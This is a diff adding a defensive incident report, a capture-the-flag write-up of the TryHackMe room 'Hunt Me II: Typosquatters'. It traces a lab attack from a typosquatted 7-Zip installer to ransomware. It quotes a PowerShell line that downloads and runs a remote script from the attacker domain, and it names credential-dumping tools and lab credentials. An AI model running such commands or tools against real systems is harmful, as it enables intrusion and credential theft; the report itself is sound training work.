@@ -1,0 +1,302 @@
+# 🛡️ Incident Report – Hunt Me II: Typosquatters
+
+## 📖 Executive Summary
+
+This report documents a host-based incident investigation conducted as part of
+the TryHackMe room “Hunt Me II – Typosquatters”.
+
+The investigation uncovered a typosquatting-based initial access technique
+that led to malicious PowerShell execution, credential harvesting, lateral
+movement, privilege escalation, and ransomware deployment.
+
+The attacker abused user trust in legitimate software downloads and relied on
+Living-off-the-Land techniques to evade detection. This report documents the
+incident chronologically, with evidence supporting each investigative step.
+
+---
+
+## 🧪 Investigation Environment
+
+- Platform: TryHackMe
+- Investigation Type: Host-based Threat Hunting
+- Evidence Standard: One screenshot per investigation step
+
+---
+
+## 🔍 Incident Timeline & Analysis
+
+### Initial Access – Typosquatted Software Download
+
+The investigation began by identifying how the compromise originated.
+Analysis of user browsing and download activity revealed that the victim
+downloaded an installer from a suspicious domain impersonating legitimate
+software.
+
+The URL accessed was:
+
+http://www.7zipp.org/a/7z2301-x64.msi
+
+This domain mimics the legitimate 7-Zip project, indicating a typosquatting
+attack.
+
+📸 Screenshot Evidence:  
+`screenshots/01_initial_access_typosquat_url.png`
+
+**Screenshot Explanation:**  
+The screenshot shows the download activity highlighting the URL
+`www.7zipp.org`, confirming the user retrieved an MSI installer from a
+typosquatted domain rather than the legitimate 7-Zip website.
+
+---
+
+### Infrastructure Identification – Malicious Host IP
+
+Further investigation into the malicious domain revealed the IP address
+hosting the installer.
+
+The resolved IP address was:
+
+206.189.34.218
+
+📸 Screenshot Evidence:  
+`screenshots/02_malicious_host_ip.png`
+
+**Screenshot Explanation:**  
+The screenshot displays DNS resolution or network log output mapping the
+typosquatted domain to IP address `206.189.34.218`, identifying attacker
+infrastructure.
+
+---
+
+### Payload Execution – Malicious MSI Installation
+
+Process execution logs showed that the downloaded MSI file was executed on
+the host.
+
+The process ID associated with this execution was:
+
+PID 2532
+
+📸 Screenshot Evidence:  
+`screenshots/03_msi_execution_pid.png`
+
+**Screenshot Explanation:**  
+The screenshot shows process creation events where the MSI installer is
+executed, with PID `2532` confirming the malicious installer was launched.
+
+---
+
+### PowerShell Abuse – Remote Script Execution
+
+Analysis of the process command line revealed that the MSI executed a
+PowerShell command to download and run an additional payload.
+
+The full command observed was:
+
+powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
+
+📸 Screenshot Evidence:  
+`screenshots/04_powershell_remote_script.png`
+
+**Screenshot Explanation:**  
+The screenshot highlights the full PowerShell command line showing
+`Invoke-WebRequest` fetching `7z.ps1` from the attacker-controlled domain,
+confirming remote code execution.
+
+---
+
+### Masquerading – Legitimate Installer Execution
+
+To reduce suspicion, the attacker later executed a legitimate installer to
+maintain user trust.
+
+The file executed was:
+
+C:\Windows\Temp\7zlegit.exe
+
+📸 Screenshot Evidence:  
+`screenshots/05_legitimate_installer_execution.png`
+
+**Screenshot Explanation:**  
+The screenshot shows execution of `7zlegit.exe`, indicating attacker attempts
+to mask malicious activity by installing the real software after compromise.
+
+---
+
+### Persistence – Malicious Service Creation
+
+Investigation of system services revealed that a new service was installed
+to maintain persistence.
+
+The service name identified was:
+
+7zService
+
+📸 Screenshot Evidence:  
+`screenshots/06_persistence_service_creation.png`
+
+**Screenshot Explanation:**  
+The screenshot displays service creation logs showing `7zService`, confirming
+a persistence mechanism installed by the attacker.
+
+---
+
+### Privilege Context – SYSTEM-Level Execution
+
+Further inspection revealed that the malicious service executed under a
+high-privilege account.
+
+The service ran as:
+
+SYSTEM
+
+📸 Screenshot Evidence:  
+`screenshots/07_system_level_execution.png`
+
+**Screenshot Explanation:**  
+The screenshot shows the service running under the SYSTEM account, confirming
+the attacker achieved high-privilege execution.
+
+---
+
+### Credential Harvesting – PowerShell Tooling
+
+Post-compromise activity showed the attacker used PowerShell tooling to
+extract credentials from the system.
+
+The tool identified was:
+
+Invoke-PowerExtract
+
+📸 Screenshot Evidence:  
+`screenshots/08_credential_harvesting_tool.png`
+
+**Screenshot Explanation:**  
+The screenshot shows PowerShell output referencing `Invoke-PowerExtract`,
+confirming credential harvesting activity.
+
+---
+
+### Credential Access – Compromised User Account
+
+The harvested credentials included the following username and hash:
+
+james.cromwell : B852A0B8BD4E00564128E0A5EA2BC4CF
+
+📸 Screenshot Evidence:  
+`screenshots/09_compromised_user_credentials.png`
+
+**Screenshot Explanation:**  
+The screenshot displays extracted credential material, confirming successful
+credential access by the attacker.
+
+---
+
+### Account Manipulation – Password Reset
+
+The attacker then reset the password of another user account, indicating
+account takeover.
+
+The new password set was:
+
+pwn3dpw!!!
+
+📸 Screenshot Evidence:  
+`screenshots/10_password_reset_activity.png`
+
+**Screenshot Explanation:**  
+The screenshot shows account modification activity where the password is
+changed, confirming attacker control over user accounts.
+
+---
+
+### Lateral Movement – Secondary Workstation Access
+
+Analysis of authentication activity revealed the compromised credentials
+were used to access another system.
+
+The workstation accessed was:
+
+WKSTN-02
+
+📸 Screenshot Evidence:  
+`screenshots/11_lateral_movement_workstation.png`
+
+**Screenshot Explanation:**  
+The screenshot highlights logon activity to `WKSTN-02`, confirming lateral
+movement within the environment.
+
+---
+
+### Privilege Escalation – Domain Credentials Discovered
+
+Further investigation uncovered additional domain-level credentials.
+
+The account identified was:
+
+SSF\itadmin : NoO6@39Sk0!
+
+📸 Screenshot Evidence:  
+`screenshots/12_domain_account_discovery.png`
+
+**Screenshot Explanation:**  
+The screenshot shows credential discovery output revealing a domain account,
+indicating progression toward domain-level compromise.
+
+---
+
+### Credential Dumping – Domain Admin Hash Extraction
+
+The attacker escalated privileges further by dumping Domain Admin credentials.
+
+The PowerShell script used was:
+
+Invoke-SharpKatz.ps1
+
+📸 Screenshot Evidence:  
+`screenshots/13_domain_admin_dump.png`
+
+**Screenshot Explanation:**  
+The screenshot shows execution of `Invoke-SharpKatz.ps1`, confirming credential
+dumping activity targeting privileged accounts.
+
+---
+
+### Impact – Ransomware Encryption
+
+The final stage of the attack involved ransomware deployment.
+
+The number of encrypted files identified was:
+
+46
+
+📸 Screenshot Evidence:  
+`screenshots/14_ransomware_impact.png`
+
+**Screenshot Explanation:**  
+The screenshot shows encrypted file indicators and counts, confirming the
+impact of the ransomware activity.
+
+---
+
+## 🚨 Indicators of Compromise (IOCs)
+
+- www.7zipp.org
+- 206.189.34.218
+- powershell.exe iex(iwr …)
+- 7zService
+- Invoke-PowerExtract
+- Invoke-SharpKatz.ps1
+
+---
+
+## 📘 Conclusion
+
+This investigation confirms a typosquatting-based attack that progressed from
+initial access to full domain compromise and ransomware deployment.
+
+The incident highlights the effectiveness of social engineering, the risks of
+PowerShell abuse, and the importance of endpoint visibility and credential
+protection within SOC operations.
+
+---
